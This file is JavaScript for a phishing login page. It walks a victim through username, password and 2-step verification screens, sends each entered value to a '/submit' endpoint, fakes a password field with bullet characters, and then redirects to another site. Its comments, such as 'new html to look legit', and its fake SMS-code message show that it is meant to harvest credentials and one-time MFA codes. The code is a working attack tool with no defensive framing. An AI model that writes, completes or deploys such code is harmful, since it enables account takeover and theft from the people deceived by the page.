var currentStep = "";
var username = "";
var password = "";
var mfa = "";

const nextButton = function( e ) {
  e.preventDefault();
  const text = document.querySelector("#inputField")

  if(currentStep === "username"){
    username = text.value;
  }
  else if (currentStep === "password") {
    password = text.value;
  }
  else if (currentStep === "mfa") {
    mfa = text.value;
  }

  var json = {
    username: username,
    password: password,
    mfa: mfa
  }
  json = JSON.stringify(json);

  // add to server
  fetch("/submit", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: json
  })
  .then(function(response) {
    return response.json();
  })
  .then(json => {
    updateScreen()
  })
  return false;
}

const updateScreen = function() {
  // update screen to parse next arg
  if(currentStep === "username"){
    moveToPassword()
    currentStep = "password"
  }
  else if (currentStep === "password") {
    moveToMFA()
    currentStep = "mfa"
  }
  else if (currentStep === "mfa") {
    window.location.href = "https://agame.com"
  }
}

const moveToPassword = function() {
  document.getElementById("headerField").innerHTML = "Complete sign in...";
  document.getElementById("subheaderField").innerHTML = username;
  document.getElementById("inputField").value = "";
  document.getElementById("Bullets").placeholder = "Enter your password";
  document.getElementById("forgotField").innerHTML = "Forgot password?";

  var bullets = document.querySelector("#Bullets")
  var inputField = document.querySelector("#inputField")

  // swap positions
  bullets.parentNode.insertBefore(inputField, bullets)

  // update opacities
  inputField.style.opacity = "0"
  bullets.style.opacity = "100"

  // update to look like password
  inputField.onkeyup = function(){
    document.getElementById('Bullets').value=this.value.replace(/(.)/g,'•');
  };
}

const moveToMFA = function() {
  // update background size
  document.getElementById("loginBackdrop").style.height = "425px"

  // update headers
  document.getElementById("headerField").innerHTML = "2-Step Verification";
  document.getElementById("subheaderField").innerHTML = "This extra step shows it's really you trying to sign in";

  // reset inputs
  var bullets = document.querySelector("#Bullets")
  var inputField = document.querySelector("#inputField")

  inputField.parentNode.insertBefore(bullets, inputField)

  // update opacities
  inputField.style.opacity = "100"
  bullets.style.opacity = "0"

  // update to look normal again
  inputField.onkeyup = function(){};

  // ****** all below should be in a case by account statements
  // new html to look legit
  var verificationTitle = document.createElement("p")
  verificationTitle.innerHTML = "2-Step Verification".bold()
  verificationTitle.style.fontSize = "large"
  verificationTitle.style.textAlign = "left"
  verificationTitle.style.padding = "0px 35px 0px 35px";
  var verificationExplained = document.createElement("p")
  verificationExplained.innerHTML = "A text message with a 6-digit verification code was just sent to your phone"
  verificationExplained.style.textAlign = "left"
  verificationExplained.style.padding = "0px 35px 0px 35px";

  bullets.parentNode.insertBefore(verificationTitle, bullets)
  bullets.parentNode.insertBefore(verificationExplained, bullets)
  bullets.remove()

  document.getElementById("inputField").value = "";
  document.getElementById("inputField").placeholder = "Enter the code";

  // otherwise explain that it is false
  // TODO:
}

window.onload = function() {
  currentStep = "username"
  const button = document.querySelector( '#loginButton' )
  button.onclick = nextButton
}
